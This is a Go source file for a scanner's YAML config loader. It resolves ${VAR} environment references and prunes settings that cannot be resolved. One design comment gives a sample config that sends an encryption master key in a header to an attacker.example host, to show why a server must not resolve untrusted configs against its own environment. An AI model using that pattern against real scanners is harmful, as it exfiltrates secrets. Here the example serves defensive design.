package config

import (
	"fmt"
	"os"

	"gopkg.in/yaml.v3"
	"regexp"
	"sort"
	"strings"
)

// A DAST engine cannot test anything behind a login without a credential, and
// a credential cannot go in .dragon.yaml: the file is committed, and this
// tool's own secret scanner would flag it -- correctly, because a token in a
// repository is a disclosed token however good the reason.
//
// So the file names the variable and the environment carries the value.
//
//	engines:
//	  zap:
//	    rules: [https://staging.example.com/]
//	dast:
//	  headers:
//	    Authorization: "Bearer ${DAST_TOKEN}"
var envReference = regexp.MustCompile(`\$\{([A-Za-z_][A-Za-z0-9_]*)(:-([^}]*))?\}`)

// escapedDollar is how a literal "${" is written: "$${". Needed because a
// pattern or a message may legitimately contain one, and a config that cannot
// express its own syntax is a config with a trap in it.
const escapedDollar = "$${"

// Lookup resolves a variable reference. It is a parameter rather than a call to
// os.LookupEnv because whose environment answers is the whole security question.
//
// For `dragon scan` the answer is the process environment: the person running
// it wrote the config and owns the secrets, and reading their own shell is the
// point of the feature.
//
// For a server evaluating a configuration file out of a repository it did not
// write, the process environment is the worst possible answer. A scanner that
// resolves ${VAR} against its own environment hands any repository it can
// clone a read primitive over every secret the scanner holds -- and DAST
// config is an egress primitive in the same file, so the two compose into
// exfiltration with no exploit needed:
//
//	dast:
//	  headers:
//	    X-Data: "${ENCRYPTION_MASTER_KEY}"
//	engines:
//	  zap:
//	    rules: ["https://attacker.example/"]
//
// So the source is supplied by whoever is trusted to decide it, and a caller
// handling untrusted input supplies one that holds only what that input is
// entitled to see.
type Lookup func(name string) (string, bool)

// OSEnv resolves against the process environment. Correct for a CLI, wrong for
// a server reading somebody else's repository.
func OSEnv(name string) (string, bool) { return os.LookupEnv(name) }

// NoEnv resolves nothing. Every reference in the document is then reported as
// unset, which is the safe direction: a configuration that wanted a variable it
// may not have fails loudly instead of quietly being given one.
func NoEnv(string) (string, bool) { return "", false }

// interpolateNode resolves references in a parsed document rather than in its
// text.
//
// Substituting on raw bytes was simpler and wrong in a way that only shows up
// in use: a reference inside a YAML comment is still text, so it still
// resolved, so a block could not be commented out. Parking configuration behind
// a # is the most ordinary thing anyone does with it, and doing so failed the
// entire scan over a variable that nothing was going to read.
//
// Walking the node tree fixes that by construction. Comments live beside
// scalars rather than inside their values, so they are simply never visited,
// and there is no comment-stripping pass to get subtly wrong on a "#" inside a
// quoted string.
func interpolateNode(n *yaml.Node, lookup Lookup, missing map[string]bool) {
	if n == nil {
		return
	}
	if n.Kind == yaml.ScalarNode {
		n.Value = substitute(n.Value, lookup, missing)
		return
	}
	for _, c := range n.Content {
		interpolateNode(c, lookup, missing)
	}
}

// unresolvedMark is left in a value whose reference nothing could resolve, so
// the setting carrying it can be found and removed after the walk.
//
// A byte sequence no YAML author writes by accident, because anything that
// survived into the parsed document would then be silently deleted.
const unresolvedMark = "\x00dragonguard-unresolved\x00"

// prune removes the settings whose values could not be resolved, and returns
// the paths it removed.
//
// Removing the setting rather than failing the file is the whole point. An
// unresolvable variable used to reject the entire configuration, which meant a
// scan lost the engine selection and the ignore list along with it -- so a
// missing DAST credential silently widened the scan and then blocked the gate
// on the false positives that the discarded ignore list existed to suppress.
// Losing one header is a small, visible gap; losing the file is a large,
// invisible one.
func prune(n *yaml.Node, path string) []string {
	if n == nil {
		return nil
	}
	var dropped []string

	switch n.Kind {
	case yaml.MappingNode:
		kept := make([]*yaml.Node, 0, len(n.Content))
		for i := 0; i+1 < len(n.Content); i += 2 {
			key, val := n.Content[i], n.Content[i+1]
			child := key.Value
			if path != "" {
				child = path + "." + key.Value
			}
			if marked(val) {
				dropped = append(dropped, child)
				continue
			}
			dropped = append(dropped, prune(val, child)...)
			kept = append(kept, key, val)
		}
		n.Content = kept

	case yaml.SequenceNode:
		kept := make([]*yaml.Node, 0, len(n.Content))
		for i, item := range n.Content {
			if marked(item) {
				dropped = append(dropped, fmt.Sprintf("%s[%d]", path, i))
				continue
			}
			dropped = append(dropped, prune(item, fmt.Sprintf("%s[%d]", path, i))...)
			kept = append(kept, item)
		}
		n.Content = kept

	default:
		for _, c := range n.Content {
			dropped = append(dropped, prune(c, path)...)
		}
	}
	return dropped
}

// marked reports whether this node is itself an unresolved value.
//
// Scalars only, deliberately. Asking whether anything *under* a node is
// unresolved would remove the nearest enclosing block instead of the setting:
// one header that could not be resolved took the whole dast: section with it,
// which is the same over-reach as rejecting the file, one level down.
func marked(n *yaml.Node) bool {
	return n != nil && n.Kind == yaml.ScalarNode && strings.Contains(n.Value, unresolvedMark)
}

// substitute resolves the references in one scalar, recording any it cannot.
func substitute(in string, lookup Lookup, missing map[string]bool) string {
	if !strings.Contains(in, "${") && !strings.Contains(in, escapedDollar) {
		return in
	}
	const placeholder = "\x00dragonguard-literal-dollar-brace\x00"
	text := strings.ReplaceAll(in, escapedDollar, placeholder)

	out := envReference.ReplaceAllStringFunc(text, func(ref string) string {
		m := envReference.FindStringSubmatch(ref)
		name, hasDefault, fallback := m[1], m[2] != "", m[3]

		if v, ok := lookup(name); ok && v != "" {
			return v
		}
		if hasDefault {
			return fallback
		}
		missing[name] = true
		return unresolvedMark
	})
	return strings.ReplaceAll(out, placeholder, "${")
}

// sortedNames returns the recorded variable names in a stable order.
func sortedNames(missing map[string]bool) []string {
	if len(missing) == 0 {
		return nil
	}
	names := make([]string, 0, len(missing))
	for n := range missing {
		names = append(names, n)
	}
	sort.Strings(names)
	return names
}

// interpolate replaces ${VAR} references using the supplied lookup.
//
// An unset variable with no default is an error, not an empty string. Empty
// would produce `Authorization: Bearer ` -- a header that is present, wrong,
// and indistinguishable from an authenticated scan until somebody reads the
// findings and wonders why everything behind the login looks clean. Leaving
// the reference in place is no better: it sends the literal "${DAST_TOKEN}".
//
// A project that genuinely wants an optional value says so with ${VAR:-} and
// means it.
func interpolate(raw []byte, lookup Lookup) ([]byte, error) {
	if lookup == nil {
		lookup = NoEnv
	}
	const placeholder = "\x00dragonguard-literal-dollar-brace\x00"
	text := strings.ReplaceAll(string(raw), escapedDollar, placeholder)

	missing := map[string]bool{}
	out := envReference.ReplaceAllStringFunc(text, func(ref string) string {
		m := envReference.FindStringSubmatch(ref)
		name, hasDefault, fallback := m[1], m[2] != "", m[3]

		if v, ok := lookup(name); ok && v != "" {
			return v
		}
		if hasDefault {
			return fallback
		}
		missing[name] = true
		return ref
	})

	if len(missing) > 0 {
		names := make([]string, 0, len(missing))
		for n := range missing {
			names = append(names, n)
		}
		sort.Strings(names)
		return nil, fmt.Errorf(
			"%s referenced by the configuration but not set in the environment "+
				"(write ${%s:-} if it is genuinely optional)",
			strings.Join(names, ", "), names[0])
	}

	return []byte(strings.ReplaceAll(out, placeholder, "${")), nil
}
